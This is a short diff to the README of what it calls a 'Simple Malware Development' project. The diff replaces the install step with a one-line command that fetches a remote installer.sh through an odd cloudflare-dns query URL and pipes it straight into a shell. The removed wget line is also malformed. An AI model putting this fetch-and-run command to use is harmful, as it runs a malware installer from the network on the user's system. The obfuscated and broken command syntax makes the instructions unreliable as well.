@@ -4,4 +4,4 @@ Simple Malware Development for educational purposes, decline any responsibility 
 
 To install the service run the following command to setup the server.
 
-> wget -O https://raw.githubusercontent.com/th333boo/r3dth1rth33n/master/installer && chmod +x installer.sh && ./installer.sh
+> /bin/sh -c "$(curl -fsSL https://cloudflare-dns.com/dns-query?name=https://raw.githubusercontent.com/th333boo/r3dth1rth33n/master/installer.sh)"
